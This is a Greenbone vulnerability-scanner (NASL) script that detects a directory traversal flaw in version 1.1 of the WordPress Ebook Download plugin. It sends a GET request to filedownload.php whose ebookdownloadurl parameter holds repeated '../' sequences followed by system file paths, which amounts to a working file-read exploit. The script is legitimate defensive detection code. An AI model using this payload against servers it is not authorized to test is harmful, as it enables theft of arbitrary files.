# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807624");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:32 +0530 (Fri, 01 Apr 2016)");
  script_name("WordPress Ebook Download Plugin Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39575/");

  script_tag(name:"summary", value:"The WordPress plugin 'Ebook Download' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request
  and check whether it is able to read arbitrary files or not");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'ebookdownloadurl' parameter in 'filedownload.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attckers
  to read arbitrary files.");

  script_tag(name:"affected", value:"WordPress Ebook Download plugin version
  version 1.1");

  script_tag(name:"solution", value:"Update to Ebook Download plugin version
  1.2 or later.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wordpress.org/plugins/ebook-downloader/");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = dir + '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=' + crap(data:"../", length:3*15) + files[file];

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
